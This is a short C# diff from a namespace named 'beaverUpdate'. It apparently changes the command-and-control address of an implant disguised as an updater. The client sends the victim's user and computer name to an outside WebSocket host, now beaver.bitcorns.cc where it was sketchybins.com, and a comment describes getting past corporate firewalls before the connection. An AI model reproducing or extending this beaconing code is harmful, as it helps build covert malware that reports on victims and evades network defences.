@@ -55,10 +55,10 @@ namespace beaverUpdate
             var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
 
             // For corp firewalls, need to init a connection before the websocket
-            string landingpage = "http://beaverpro.sketchybins.com/";
-            Task<string> webRequestTask = WebRequestHelper.PerformWebRequestAsync(landingpage);
-            await Task.Delay(3000); // giving the firewall some time
-            Task socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com/checkupdate?client={client}"));
+            //string landingpage = "http://beaver.bitcorns.cc/";
+            //Task<string> webRequestTask = WebRequestHelper.PerformWebRequestAsync(landingpage);
+            //await Task.Delay(3000); // giving the firewall some time
+            Task socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"wss://beaver.bitcorns.cc/checkupdate?client={client}"));
             
 
             // Start the task flow
